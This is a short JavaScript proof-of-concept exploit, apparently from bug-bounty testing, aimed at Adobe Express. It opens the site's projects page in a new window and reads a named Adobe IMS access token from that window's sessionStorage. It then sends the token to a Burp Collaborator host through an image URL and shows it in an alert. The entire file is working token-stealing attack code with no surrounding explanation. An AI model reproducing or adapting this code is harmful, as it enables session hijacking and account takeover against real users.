// Clean the page
document.body.innerHTML = "";

// Add a button to the page
let button = document.createElement("button");
button.innerText = "Click Me";
document.body.appendChild(button);

button.onclick = () => {
    // Open a new window
    let newWindow = window.open("https://express.adobe.com/sp/projects", "_blank");

    // Wait for 4 seconds
    setTimeout(() => {
        try {
            // Access sessionStorage from the newly opened window
            let sessionData = newWindow.sessionStorage.getItem("adobeid_ims_access_token/MarvelWeb3/false/AdobeID,DCAPI,ab.manage,additional_info.creation_source,additional_info.incomplete,additional_info.projectedProductContext,creative_cloud,creative_sdk,gnav,mps,openid,read_organizations,stk.a.k12_access.cru,stk.a.limited_license.cru,tk_platform,tk_platform_refresh_user,tk_platform_sync"); // Replace "yourKey" with your specific key

            // Send the session data to another server using an image
            if (sessionData) {
                let img = new Image();
                img.src = `https://ap3uw7o7w6y9ju104k7ul2c03r9ixgl5.burpcollaborator.net/endpoint?data=${encodeURIComponent(sessionData)}`;
                document.body.appendChild(img); // Optional: Append the image to the DOM
                alert(sessionData)
            }
        } catch (error) {
            console.error("Error accessing sessionStorage:", error);
        }
    }, 4000);
};
